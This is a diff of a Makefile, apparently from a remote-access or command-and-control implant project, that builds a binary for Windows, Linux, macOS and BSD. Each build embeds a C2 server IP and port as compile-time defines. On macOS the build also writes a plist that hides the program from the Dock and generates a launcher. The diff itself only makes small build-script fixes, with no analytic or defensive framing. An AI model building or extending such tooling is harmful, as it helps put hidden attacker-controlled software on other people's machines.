@@ -25,7 +25,7 @@ endef
 
 
 # 检查是否有 cl.exe，有则用 cl，没有则用 gcc
-ifneq ($(findstring cl,$(shell where cl 2>nul)),)
+ifneq ($(findstring cl,$(shell where cl)),)
 CC := cl
 else
 CC := gcc
@@ -54,12 +54,10 @@ endif
 
 ifeq ($(shell uname -s),Linux)
 	$(eval $(call uninput))
-	@rm -rf ./nul
 	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
 endif
 ifeq ($(findstring Darwin,$(shell uname -s)),Darwin)
 	$(eval $(call uninput))
-	@rm -rf ./nul
 	@printf '<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>LSUIElement</key><true/></dict></plist>' > temp.plist
 	
 	@printf '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <libgen.h>\n#include <mach-o/dyld.h>\n\
@@ -82,14 +80,13 @@ ifeq ($(findstring Darwin,$(shell uname -s)),Darwin)
 endif
 ifeq ($(shell uname -s),BSD)
 	$(eval $(call uninput))
-	@rm -rf ./nul
 	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
 endif
 
 
 clean:
 ifeq ($(OS),Windows_NT)
-	cmd /c erase /f /s /q $(BIN) $(BIN).*
+	cmd /c erase /f /q $(BIN) $(BIN).*
 else
 	sh -c "rm -rf $(BIN) $(BIN).*"
 endif
